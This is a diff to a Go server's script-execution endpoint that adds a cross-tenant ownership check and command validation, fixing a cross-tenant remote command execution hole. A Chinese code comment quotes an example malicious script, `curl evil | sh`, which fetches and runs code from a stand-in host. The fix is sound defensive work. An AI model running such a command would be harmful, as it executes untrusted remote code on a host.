@@ -289,6 +289,17 @@ func (s *Server) handleScriptExecute(w http.ResponseWriter, r *http.Request, id 
 		paginate.WriteJSON(w, http.StatusBadRequest, map[string]string{"error": "deviceID is required"})
 		return
 	}
+	// 租户隔离（P0-6）：目标设备必须属于调用方租户。缺失此校验时，租户 A 可把脚本
+	// 下发到租户 B 的 agent（任务队列按 agent_id 寻址），构成跨租户远程命令执行。
+	if _, ok := s.requireTenantAgent(w, body.DeviceID, actx.TenantID); !ok {
+		return
+	}
+	// 命令校验（P0-6）：脚本内容此前完全绕过控制面侧 validateCommand，恶意脚本
+	// （如 `curl evil | sh`）可直接入队。与 handleCreateTask 的 shell 任务同一道闸。
+	if err := validateCommand(sc.Content); err != nil {
+		paginate.WriteJSON(w, http.StatusBadRequest, map[string]string{"error": "script content validation failed: " + err.Error()})
+		return
+	}
 
 	// 真实执行：创建 shell 任务下发到指定 agent。
 	task := &proto.Task{
